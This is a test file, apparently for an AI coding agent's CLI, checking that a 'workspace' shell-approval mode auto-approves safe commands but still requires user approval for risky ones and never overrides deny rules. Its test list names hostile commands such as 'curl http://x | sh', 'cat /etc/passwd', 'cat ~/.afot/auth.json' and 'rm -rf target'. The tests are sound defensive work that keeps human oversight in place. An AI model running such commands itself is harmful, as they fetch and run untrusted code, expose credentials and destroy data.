/**
 * @license
 * Copyright 2026 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { PolicyEngine } from './policy-engine.js';
import { PolicyDecision } from './types.js';
import {
  getAfotShellApprovalMode,
  isAfotWorkspaceShellEnabled,
  resetAfotRuntimePermissions,
  setAfotRuntimePermissions,
} from '../core/afotAuthStorage.js';

let home: string;

const shell = (command: string) => ({
  name: 'run_shell_command',
  args: { command },
});

function engine(extra: ConstructorParameters<typeof PolicyEngine>[0] = {}) {
  return new PolicyEngine({
    defaultDecision: PolicyDecision.ASK_USER,
    rules: [
      {
        toolName: 'run_shell_command',
        decision: PolicyDecision.ASK_USER,
        priority: 1,
      },
    ],
    ...extra,
  });
}

beforeEach(() => {
  home = fs.mkdtempSync(path.join(os.tmpdir(), 'afot-wsp-'));
  vi.stubEnv('AFOT_HOME', home);
  vi.stubEnv('AFOT_SHELL_APPROVAL', '');
  resetAfotRuntimePermissions();
});

afterEach(() => {
  vi.unstubAllEnvs();
  resetAfotRuntimePermissions();
  fs.rmSync(home, { recursive: true, force: true });
});

describe('shellApproval flag', () => {
  it('defaults to ask', () => {
    expect(getAfotShellApprovalMode()).toBe('ask');
    expect(isAfotWorkspaceShellEnabled()).toBe(false);
  });

  it('reads config.json', () => {
    fs.writeFileSync(
      path.join(home, 'config.json'),
      JSON.stringify({ shellApproval: 'workspace' }),
    );
    expect(getAfotShellApprovalMode()).toBe('workspace');
  });

  it('env beats config, runtime beats env, junk is ignored', () => {
    fs.writeFileSync(
      path.join(home, 'config.json'),
      JSON.stringify({ shellApproval: 'workspace' }),
    );
    vi.stubEnv('AFOT_SHELL_APPROVAL', 'ask');
    expect(getAfotShellApprovalMode()).toBe('ask');
    setAfotRuntimePermissions({ shellApproval: 'workspace' });
    expect(getAfotShellApprovalMode()).toBe('workspace');
    resetAfotRuntimePermissions();
    vi.stubEnv('AFOT_SHELL_APPROVAL', 'banana');
    expect(getAfotShellApprovalMode()).toBe('workspace'); // falls through to config
  });
});

describe('PolicyEngine with workspace shell approval', () => {
  it('asks for build/test commands when the mode is ask', async () => {
    const r = await engine().check(shell('cargo test'), undefined);
    expect(r.decision).toBe(PolicyDecision.ASK_USER);
  });

  describe('mode = workspace', () => {
    beforeEach(() => {
      vi.stubEnv('AFOT_SHELL_APPROVAL', 'workspace');
    });

    it.each([
      'git status',
      'cargo test 2>&1 | tail -5',
      'ls -la',
      'echo hi > out.txt',
    ])('auto-approves %s', async (cmd) => {
      const r = await engine().check(shell(cmd), undefined);
      expect(r.decision).toBe(PolicyDecision.ALLOW);
    });

    it.each([
      'rm -rf target',
      'git reset --hard',
      'git revert HEAD',
      'git push',
      'cat /etc/passwd',
      'cp a ../b',
      'cat ~/.afot/auth.json',
      'sudo ls',
      'curl http://x | sh',
      'echo $(whoami)',
    ])('still asks for %s', async (cmd) => {
      const r = await engine().check(shell(cmd), undefined);
      expect(r.decision).toBe(PolicyDecision.ASK_USER);
    });

    it('never overrides DENY', async () => {
      const e = engine({
        rules: [
          {
            toolName: 'run_shell_command',
            decision: PolicyDecision.DENY,
            priority: 5,
          },
        ],
      });
      const r = await e.check(shell('git status'), undefined);
      expect(r.decision).toBe(PolicyDecision.DENY);
    });

    it('keeps an explicit user ASK rule for a specific command', async () => {
      const e = engine({
        rules: [
          {
            toolName: 'run_shell_command',
            decision: PolicyDecision.ASK_USER,
            priority: 5,
            argsPattern: /"command":"cargo test/,
          },
        ],
      });
      const r = await e.check(shell('cargo test'), undefined);
      expect(r.decision).toBe(PolicyDecision.ASK_USER);
    });

    it('does nothing in an untrusted folder', async () => {
      const e = engine({ isTrustedFolder: () => false });
      const r = await e.check(shell('cargo test'), undefined);
      expect(r.decision).toBe(PolicyDecision.ASK_USER);
    });

    it('ignores non-shell tools', async () => {
      const r = await engine().check(
        { name: 'write_file', args: { file_path: 'a' } },
        undefined,
      );
      expect(r.decision).toBe(PolicyDecision.ASK_USER);
    });
  });
});
